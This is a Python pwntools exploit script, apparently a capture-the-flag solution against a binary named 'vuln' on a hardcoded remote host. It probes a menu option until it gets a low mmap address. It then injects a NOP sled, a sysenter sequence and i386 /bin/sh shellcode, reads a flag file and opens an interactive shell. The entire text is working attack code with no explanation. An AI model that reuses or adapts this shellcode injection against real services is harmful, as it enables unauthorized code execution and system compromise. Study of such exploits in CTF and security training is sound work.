#!/usr/bin/env python
from pwn import *
import sys

remote_ip,port = '116.203.18.177','65432'
binary = ['./vuln']

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace  = True
else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc-2.28.so"})


reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

def get_vdso():
    maps = io.recvuntil('[vdso]').split('\n')[-1]
    vdso = int('0x' + maps.split('-')[0], 16)
    vdso = (vdso & 0xffffffff)
    return vdso


def choose_from_menu(choice):
    io.sendlineafter('beer\n\n', choice)

def beer():
    choose_from_menu('b')
    io.recvuntil('@')
    address = int(io.recvline()[:-1], 16)
    return address

count = 0
while True:
    mmap = beer()
    if(mmap < 0x10000):
        break
    if(count==10000):
        break
    print("iteration {}".format(count))
    count+=1

log.success('success!')
log.info('mmap: {}'.format(hex(mmap)))
gdb.attach(io)

shellcode = asm('mov esp, {}\n'.format(mmap + 512) + shellcraft.i386.sh())

payload = '\x90' * (512)
payload += '\x0f\x34'
#payload += '\xcd\x80'
payload += '\x90' * (4096 - len(payload) - len(shellcode))
payload += shellcode
choose_from_menu('h')
io.sendlineafter('gib:\n', payload)
try:
    sl("cat /flag_*.txt")
    if(io.recv()=='\x00'):
        raise EOFError
    else:
        log.success("Found")
        io.interactive()
except EOFError:
    log.info("failed")
    io.close()
